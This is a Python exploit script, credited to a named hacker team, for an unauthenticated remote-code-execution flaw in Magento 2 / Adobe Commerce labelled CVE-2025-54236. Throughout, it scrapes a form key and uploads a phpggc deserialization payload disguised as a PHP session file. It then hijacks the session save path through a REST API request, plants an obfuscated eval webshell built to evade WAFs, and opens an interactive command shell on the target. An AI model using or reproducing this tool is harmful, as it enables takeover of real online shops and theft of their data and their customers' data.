#!/usr/bin/env python3
"""
SessionReaper — CVE-2025-54236 PoC
Magento 2 / Adobe Commerce Unauthenticated RCE
Via DI Traversal + File-Based Session Poisoning

Author  : baba01hacker | Doraemon Cyber Team (DCT)
CVE     : CVE-2025-54236
CVSS    : 9.1 (Critical)
Target  : Magento 2.x with file-based session storage (default)
Requires: phpggc in PATH

Attack Chain:
  1. Scrape form_key from login/register page
  2. Upload phpggc Guzzle/FW1 payload as a fake session file
     via /customer/address_file/upload
  3. Trigger DI traversal via POST /rest/default/V1/guest-carts/{id}/shipping-information
     → addressInformation.shipping_address.customer_session.session_config.save_path
     → ini_set('session.save_path', <media dir with our sess_ file>)
  4. PHP loads our session file at request shutdown → Guzzle destructor fires
     → file_put_contents(pub/<shell>.php, <webshell>)
  5. Verify RCE via the dropped shell

References:
  https://slcyber.io/research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/
  https://pentest-tools.com/blog/sessionreaper-cve-2025-54236-exploit
  https://sansec.io/research/sessionreaper
"""

import requests
import string
import random
import sys
import subprocess
import shutil
import tempfile
import os
import re
import json
import argparse
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────────────────────
# ANSI Colors
# ─────────────────────────────────────────────────────────────────────────────
R  = "\033[1;31m"
G  = "\033[1;32m"
Y  = "\033[1;33m"
B  = "\033[1;34m"
C  = "\033[1;36m"
W  = "\033[0m"

def banner():
    print(f"""{C}
  ███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗
  ██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║
  ███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║
  ╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║
  ███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║
  ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

  ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝

  {Y}CVE-2025-54236 — SessionReaper{W}
  {R}baba01hacker | Doraemon Cyber Team (DCT){W}
  {B}Magento 2 Unauthenticated RCE via DI Traversal + Session Poisoning{W}
""")


# ─────────────────────────────────────────────────────────────────────────────
# Exploit Class
# ─────────────────────────────────────────────────────────────────────────────
class SessionReaperExploit:

    # Pages reliably containing form_key
    FORMKEY_PAGES = [
        "/customer/account/login",
        "/customer/account/create",
        "/checkout/cart",
        "/",
    ]

    # Multi-pattern form_key extraction
    FORMKEY_PATTERNS = [
        r'["\']formKey["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']',
        r'<input[^>]+name=["\']form_key["\'][^>]+value=["\']([a-zA-Z0-9]+)["\']',
        r'<input[^>]+value=["\']([a-zA-Z0-9]+)["\'][^>]+name=["\']form_key["\']',
        r'FORM_KEY\s*[=:]\s*["\']([a-zA-Z0-9]+)["\']',
        r'"formKey"\s*:\s*"([a-zA-Z0-9]+)"',
        r"var\s+FORM_KEY\s*=\s*'([a-zA-Z0-9]+)'",
    ]

    def __init__(self, target_url, store_code="default", verify_ssl=True, verbose=False):
        self.target_url  = target_url.rstrip('/')
        self.store_code  = store_code
        self.verify_ssl  = verify_ssl
        self.verbose     = verbose
        self.form_key    = None
        self.cart_id     = None

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/124.0.0.0 Safari/537.36'
        })
        self.session.verify = verify_ssl

        if not shutil.which("phpggc"):
            self._die("phpggc is required but not found in PATH.\n"
                      "Install: git clone https://github.com/ambionics/phpggc && "
                      "ln -s $(pwd)/phpggc/phpggc /usr/local/bin/phpggc")

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _log(self, level, msg):
        prefix = {
            'info'  : f"{B}[*]{W}",
            'good'  : f"{G}[+]{W}",
            'warn'  : f"{Y}[!]{W}",
            'error' : f"{R}[-]{W}",
            'rce'   : f"{G}[!!!]{W}",
        }.get(level, "[?]")
        print(f"  {prefix} {msg}")

    def _die(self, msg):
        self._log('error', msg)
        sys.exit(1)

    def _rand_str(self, length=8, charset=string.ascii_lowercase + string.digits):
        return ''.join(random.choices(charset, k=length))

    def _rand_hex(self, length=32):
        return ''.join(random.choices('0123456789abcdef', k=length))

    def _api_url(self, path):
        return urljoin(self.target_url, f"/rest/{self.store_code}{path}")

    # ── Phase 0: Prerequisites check ─────────────────────────────────────────

    def check_prerequisites(self):
        self._log('info', "Running prerequisite checks...")

        # 1. Basic connectivity
        try:
            r = self.session.get(self.target_url, timeout=10)
            self._log('good', f"Target reachable — HTTP {r.status_code}")
        except requests.ConnectionError as e:
            self._die(f"Cannot reach target: {e}")

        # 2. Detect Magento fingerprint
        r2 = self.session.get(self.target_url, timeout=10)
        if any(x in r2.text for x in ['Mage.', 'mage-', 'magento', 'Magento']):
            self._log('good', "Magento fingerprint confirmed")
        else:
            self._log('warn', "Magento not detected — target may not be vulnerable")

        # 3. Check if PHPSESSID is file-based (simple hex string = file session)
        session_cookie = r2.cookies.get('PHPSESSID', '')
        if re.match(r'^[0-9a-f]{26,}$', session_cookie):
            self._log('good', f"File-based session detected (PHPSESSID={session_cookie[:16]}...)")
        else:
            self._log('warn', f"PHPSESSID format unusual: '{session_cookie}' — may be Redis/memcached")
            self._log('warn', "Exploit requires file-based sessions (default Magento)")

        # 4. Check REST API
        rest_url = self._api_url("/V1/store/storeConfigs")
        try:
            r3 = self.session.get(rest_url, timeout=10)
            self._log('good' if r3.status_code in (200, 401) else 'warn',
                      f"REST API status: HTTP {r3.status_code}")
        except Exception:
            self._log('warn', "REST API unreachable — check store_code or API enablement")

        # 5. Check upload endpoint existence
        upload_url = urljoin(self.target_url, "/customer/address_file/upload")
        r4 = self.session.options(upload_url, timeout=10)
        if r4.status_code < 500:
            self._log('good', f"Upload endpoint accessible (HTTP {r4.status_code})")
        else:
            self._log('warn', f"Upload endpoint returned HTTP {r4.status_code} — may be patched")

        print()

    # ── Phase 1: form_key extraction ─────────────────────────────────────────

    def get_form_key(self):
        self._log('info', "Extracting form_key...")

        for page in self.FORMKEY_PAGES:
            url = urljoin(self.target_url, page)

            for attempt in range(2):
                try:
                    verify = self.verify_ssl if attempt == 0 else False
                    r = self.session.get(url, timeout=15, verify=verify, allow_redirects=True)

                    if self.verbose:
                        self._log('info', f"  {page} → HTTP {r.status_code} | {len(r.text)} bytes")

                    if r.status_code not in (200, ):
                        break

                    for pat in self.FORMKEY_PATTERNS:
                        m = re.search(pat, r.text, re.IGNORECASE)
                        if m:
                            self.form_key = m.group(1)
                            self._log('good', f"form_key found on {page}: {self.form_key}")
                            return True

                except requests.exceptions.SSLError:
                    if attempt == 0:
                        self._log('warn', f"SSL error on {page}, retrying without verify...")
                        continue
                    break
                except requests.RequestException as e:
                    self._log('warn', f"Request error on {page}: {e}")
                    break

        # Fallback: try to grab it from the admin panel (some misconfigs expose it)
        self._log('warn', "Standard pages failed. Trying admin fallback...")
        try:
            r = self.session.get(urljoin(self.target_url, "/admin"), timeout=10)
            for pat in self.FORMKEY_PATTERNS:
                m = re.search(pat, r.text, re.IGNORECASE)
                if m:
                    self.form_key = m.group(1)
                    self._log('good', f"form_key found on /admin: {self.form_key}")
                    return True
        except Exception:
            pass

        self._log('error', "Could not extract form_key from any page.")
        self._log('warn', "The target may require auth before serving form_key, "
                          "or a different upload bypass may be needed.")
        return False

    # ── Phase 2: phpggc payload generation ───────────────────────────────────

    def generate_payload(self, target_file, php_stub):
        """
        Use Guzzle/FW1 gadget chain to write php_stub into target_file
        at PHP request shutdown (__destruct).
        """
        self._log('info', f"Generating Guzzle/FW1 gadget chain → {target_file}")

        fd, temp_path = tempfile.mkstemp(suffix=".php")
        try:
            with os.fdopen(fd, 'w') as f:
                f.write(php_stub)

            cmd = ["phpggc", "Guzzle/FW1", target_file, temp_path]
            if self.verbose:
                self._log('info', f"Running: {' '.join(cmd)}")

            result = subprocess.run(cmd, capture_output=True, check=True)

            # PHP session files must start with valid serialized data.
            # Prefix "_|" is a valid empty session variable that PHP's
            # session_start() will parse without error before reaching our payload.
            payload = b"_|" + result.stdout
            self._log('good', f"Payload generated ({len(payload)} bytes)")
            return payload

        except subprocess.CalledProcessError as e:
            self._die(f"phpggc failed:\n{e.stderr.decode()}")
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

    # ── Phase 3: Session file upload ─────────────────────────────────────────

    def upload_session_file(self, session_id, payload_bytes):
        """
        Upload the phpggc payload as a fake PHP session file.
        The filename must be sess_{session_id} so PHP's file session handler
        will load it when PHPSESSID={session_id} cookie is presented.
        """
        filename = f"sess_{session_id}"
        self._log('info', f"Uploading malicious session file as: {filename}")

        url = urljoin(self.target_url, "/customer/address_file/upload")

        # The field name triggers address file handling which bypasses
        # standard upload restrictions and lands in pub/media/customer_address/
        files = {
            'custom_attributes[country_id]': (
                filename,
                payload_bytes,
                'application/octet-stream'
            )
        }
        data = {'form_key': self.form_key}

        try:
            r = self.session.post(url, data=data, files=files, timeout=20)

            if self.verbose:
                self._log('info', f"Upload response: HTTP {r.status_code}")
                self._log('info', f"Upload body: {r.text[:300]}")

            if r.status_code == 200:
                try:
                    resp_json = r.json()
                    if 'file' in resp_json:
                        path = resp_json['file']
                        self._log('good', f"Upload successful. Server path: {path}")
                        return path
                    elif 'error' in resp_json:
                        self._log('error', f"Upload error from server: {resp_json}")
                        return None
                except (ValueError, KeyError):
                    pass

                # If no JSON response, infer the standard Magento media path.
                # Magento hashes uploads into a/b/<filename> subdirectory structure.
                h1 = filename[0]
                h2 = filename[1] if len(filename) > 1 else filename[0]
                inferred = f"/{h1}/{h2}/{filename}"
                self._log('warn', f"No JSON in upload response — inferring path: {inferred}")
                return inferred

            elif r.status_code == 403:
                self._log('error', "HTTP 403 on upload — endpoint may require auth or CSRF token is wrong")
            elif r.status_code == 404:
                self._log('error', "HTTP 404 — /customer/address_file/upload not present on this install")
            else:
                self._log('error', f"Unexpected upload response: HTTP {r.status_code}")

        except requests.RequestException as e:
            self._log('error', f"Upload request failed: {e}")

        return None

    # ── Phase 4: DI traversal trigger ────────────────────────────────────────

    def create_guest_cart(self):
        """Create a guest cart and return the cartId (required for shipping endpoint)."""
        url = self._api_url("/V1/guest-carts")
        try:
            r = self.session.post(
                url,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10
            )
            if r.status_code == 200:
                cart_id = r.text.strip().strip('"')
                if cart_id and len(cart_id) > 5:
                    self._log('good', f"Guest cart created: {cart_id}")
                    return cart_id
        except Exception as e:
            self._log('warn', f"Cart creation exception: {e}")

        # Fallback: random cart ID — the DI deserialization fires in
        # ServiceInputProcessor BEFORE business logic validates the cart,
        # so a non-existent cart ID still triggers the vulnerability.
        fallback = self._rand_hex(32)
        self._log('warn', f"Cart creation failed — using random fallback: {fallback}")
        return fallback

    def trigger_deserialization(self, session_id, save_path):
        """
        POST to /rest/default/V1/guest-carts/{id}/shipping-information

        The REAL DI graph traversal (CVE-2025-54236):

          addressInformation                     → ShippingInformation
            └─ shipping_address                  → Quote\Model\Quote\Address
                 └─ customer_session             → Customer\Model\Session (extends SessionManager)
                      └─ session_config          → Session\Config (via ConfigInterface)
                           └─ save_path          → ini_set('session.save_path', <value>)

        When SessionManager::__construct() fires → start() → initIniOptions()
        iterates $sessionConfig->getOptions() and calls ini_set() on each,
        including session.save_path — redirecting PHP's session handler to
        our upload directory where sess_{session_id} lives.

        PHP then deserializes it at request shutdown, triggering Guzzle/FW1
        __destruct() which calls file_put_contents(target_file, stub).
        """
        self._log('info', f"Triggering DI traversal → session.save_path = {save_path}")

        cart_id = self.cart_id or self.create_guest_cart()

        url = self._api_url(f"/V1/guest-carts/{cart_id}/shipping-information")

        payload = {
            "addressInformation": {
                "shipping_address": {
                    # DI traversal into Customer\Model\Session → Session\Config
                    "customer_session": {
                        "session_config": {
                            "save_path": save_path
                        }
                    }
                },
                # Required fields to pass basic schema validation before DI fires
                "billing_address": {},
                "shipping_carrier_code": "flatrate",
                "shipping_method_code": "flatrate"
            }
        }

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        # Bind our poisoned session ID — when PHP starts the session with
        # the redirected save_path, it loads sess_{session_id} from our upload dir
        cookies = {'PHPSESSID': session_id}

        try:
            r = self.session.post(
                url,
                json=payload,
                headers=headers,
                cookies=cookies,
                timeout=20
            )
            self._log('info', f"DI trigger response: HTTP {r.status_code}")

            if self.verbose:
                self._log('info', f"Response body: {r.text[:400]}")

        except requests.Timeout:
            # Timeout is fine — __destruct fires at PHP request shutdown,
            # which happens even if we time out waiting for the response.
            self._log('warn', "Timeout — PHP shutdown destructor should still have fired")
        except requests.RequestException as e:
            self._log('warn', f"Request exception (may still have worked): {e}")

    # ── Phase 5: Verification ─────────────────────────────────────────────────

    def verify_rce(self, shell_url, post_param):
        self._log('info', f"Verifying RCE at {shell_url} ...")

        import base64
        test_cmd = base64.b64encode(b"echo 'DCT_RCE_BABA01';").decode()

        try:
            r = requests.post(
                shell_url,
                data={post_param: test_cmd},
                timeout=12,
                verify=self.verify_ssl
            )
            if "DCT_RCE_BABA01" in r.text:
                return True
        except requests.RequestException as e:
            self._log('warn', f"Verification request failed: {e}")

        return False

    # ── Interactive shell ─────────────────────────────────────────────────────

    def interactive_shell(self, shell_url, post_param):
        import base64
        print(f"\n{G}  [+] Entering interactive shell. Type 'exit' to quit.{W}")
        print(f"  {Y}Shell: {shell_url}{W}")
        print(f"  {Y}Param: {post_param}{W}\n")

        while True:
            try:
                cmd = input(f"  {C}shell{W}> ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if cmd.lower() in ('exit', 'quit'):
                break
            if not cmd:
                continue

            encoded = base64.b64encode(f"system({json.dumps(cmd)});".encode()).decode()
            try:
                r = requests.post(
                    shell_url,
                    data={post_param: encoded},
                    timeout=20,
                    verify=self.verify_ssl
                )
                output = r.text.strip()
                if output:
                    print(f"  {output}")
                else:
                    print(f"  {Y}(no output){W}")
            except requests.RequestException as e:
                print(f"  {R}Error: {e}{W}")

    # ── Main flow ─────────────────────────────────────────────────────────────

    def run(self, no_shell=False, custom_webroot=None):
        banner()

        # ── Phase 0: Prerequisites
        self.check_prerequisites()

        # ── Phase 1: form_key
        if not self.get_form_key():
            self._die("Aborting — form_key required for upload.")

        # ── Setup
        session_id = self._rand_hex(32)
        shell_name = self._rand_str(6) + ".php"
        post_param = self._rand_str(5)

        # Webshell stub — eval with base64 decode to avoid WAF keyword matching
        php_stub = f"<?php @eval(base64_decode($_POST['{post_param}'])); ?>"

        # Target path within Magento webroot where the shell will land
        # Guzzle/FW1 writes the stub content to this path at __destruct time
        shell_target = f"pub/{shell_name}"

        self._log('info', f"Session ID   : {session_id}")
        self._log('info', f"Shell target : {shell_target}")
        self._log('info', f"Post param   : {post_param}")
        print()

        # ── Phase 2: Generate payload
        payload_bytes = self.generate_payload(shell_target, php_stub)

        # ── Phase 3: Upload session file
        uploaded_path = self.upload_session_file(session_id, payload_bytes)
        if not uploaded_path:
            self._die("Upload failed — cannot proceed without session file on target.")

        # ── Build save_path
        # uploaded_path is typically: /a/b/sess_{session_id}
        # We need the directory: pub/media/customer_address/a/b
        # so PHP's session handler finds sess_{session_id} there.
        upload_dir = uploaded_path.rsplit('/', 1)[0]  # e.g. /a/b

        if custom_webroot:
            # Absolute path preferred when webroot is known
            save_path = f"{custom_webroot.rstrip('/')}/pub/media/customer_address{upload_dir}"
        else:
            # Relative path from Magento root — works on most standard installs
            save_path = f"pub/media/customer_address{upload_dir}"

        self._log('info', f"Computed save_path: {save_path}")
        print()

        # ── Phase 4: Trigger DI traversal (up to 3 attempts)
        for attempt in range(1, 4):
            self._log('info', f"DI trigger attempt {attempt}/3...")
            self.trigger_deserialization(session_id, save_path)

            # ── Phase 5: Verify
            shell_url = urljoin(self.target_url, f"/pub/{shell_name}")
            if self.verify_rce(shell_url, post_param):
                print()
                print(f"  {G}{'─'*60}{W}")
                self._log('rce', f"RCE CONFIRMED — baba01hacker@DoraemonCyberTeam")
                print(f"  {G}{'─'*60}{W}")
                self._log('good', f"Shell URL  : {shell_url}")
                self._log('good', f"Post Param : {post_param}")
                self._log('good', f"Session ID : {session_id}")
                print()

                if not no_shell:
                    self.interactive_shell(shell_url, post_param)
                return True
            else:
                self._log('warn', f"Attempt {attempt}: Shell not yet accessible. Retrying...")

        # Final attempt with absolute path guess if relative failed
        if not custom_webroot:
            self._log('warn', "Relative path attempts failed. Trying absolute path guesses...")
            for webroot_guess in ["/var/www/html", "/var/www/magento", "/var/www", "/srv/www/html"]:
                save_path_abs = f"{webroot_guess}/pub/media/customer_address{upload_dir}"
                self._log('info', f"Trying webroot: {webroot_guess}")
                self.trigger_deserialization(session_id, save_path_abs)
                shell_url = urljoin(self.target_url, f"/pub/{shell_name}")
                if self.verify_rce(shell_url, post_param):
                    print()
                    self._log('rce', f"RCE CONFIRMED with webroot={webroot_guess}")
                    self._log('good', f"Shell URL  : {shell_url}")
                    self._log('good', f"Post Param : {post_param}")
                    if not no_shell:
                        self.interactive_shell(shell_url, post_param)
                    return True

        print()
        self._log('error', "All attempts failed. Possible reasons:")
        print(f"""
    {Y}1. Session storage is not file-based (Redis/Memcached) — not exploitable this way
    2. Upload endpoint is disabled or patched
    3. Magento web root differs from standard paths — use --webroot to specify
    4. The target is running Magento >= 2.4.9-p2 (patched)
    5. PHP open_basedir or SELinux is restricting ini_set('session.save_path')
    6. pub/media/ write permissions are restricted{W}
""")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-54236 SessionReaper — Magento 2 Unauthenticated RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 sessionreaper_v5.py https://shop.example.com
  python3 sessionreaper_v5.py https://shop.example.com --store-code en
  python3 sessionreaper_v5.py https://shop.example.com --webroot /var/www/magento
  python3 sessionreaper_v5.py https://shop.example.com --no-verify --verbose --no-shell
"""
    )
    parser.add_argument("target",
                        help="Target Magento URL (e.g. https://shop.example.com)")
    parser.add_argument("--store-code", default="default",
                        help="Magento REST store code (default: 'default')")
    parser.add_argument("--webroot", default=None,
                        help="Absolute server webroot path (e.g. /var/www/html)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Disable SSL certificate verification")
    parser.add_argument("--no-shell", action="store_true",
                        help="Skip interactive shell after successful RCE")
    parser.add_argument("--verbose", action="store_true",
                        help="Enable verbose debug output")

    args = parser.parse_args()

    exploit = SessionReaperExploit(
        target_url=args.target,
        store_code=args.store_code,
        verify_ssl=not args.no_verify,
        verbose=args.verbose,
    )

    exploit.run(
        no_shell=args.no_shell,
        custom_webroot=args.webroot,
    )


if __name__ == "__main__":
    main()